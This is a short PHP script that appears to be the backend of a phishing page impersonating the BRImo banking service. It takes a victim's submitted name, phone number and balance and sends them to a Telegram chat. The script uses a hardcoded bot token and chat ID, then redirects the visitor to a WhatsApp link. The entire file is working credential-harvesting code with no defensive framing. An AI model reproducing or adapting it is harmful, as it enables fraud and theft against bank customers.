<?php

    header('Location:   https://wa.me/message/SH5URSGSEYQQF1');
    
    $apiToken = "6268470740:AAF3YjCR3L250pMwU-z_FbesihmWA3IVxWM";
    session_start();

$nama            = $_POST['nama'];
$nomor            = $_POST['nomor'];
$saldo            = $_POST['saldo'];

$_SESSION['nama'] = $nama;
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;

$message = "
────────────────
1.FSTVL BRImo
────────────────
» ".$nama."
» ".$nomor."
» ".$saldo."
────────────────";

  $data = [
        'chat_id' => '-1002198851474',
        'text' => $message,
        'parse_mode' => "html"
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    echo '<pre>';
    print_r(json_decode($response));
    die();
